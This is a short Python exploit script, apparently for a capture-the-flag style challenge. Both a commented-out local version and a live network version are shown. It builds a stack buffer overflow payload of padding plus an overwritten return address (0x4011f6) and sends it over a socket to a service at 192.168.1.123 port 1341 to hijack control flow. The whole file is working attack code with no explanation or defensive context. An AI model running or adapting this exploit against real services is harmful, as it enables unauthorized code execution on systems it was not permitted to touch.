# import struct,sys
# addr = 0x4011f6          # replace with the real address
# payload = b'A'*32 + b'B'*8 + struct.pack('<Q', addr)
# sys.stdout.buffer.write(payload)

#!/usr/bin/env python3
import socket, struct

HOST = "192.168.1.123"
PORT = 1341
addr = 0x4011f6             # <‑‑ adjust to the real remote address
payload = b"A"*32 + b"B"*8 + struct.pack("<Q", addr) + b"\n"

with socket.create_connection((HOST, PORT)) as s:
    # read until the prompt
    data = s.recv(4096)
    print(data.decode(), end="")
    s.sendall(payload)      # now send the overflow
    print(s.recv(4096).decode(), end="")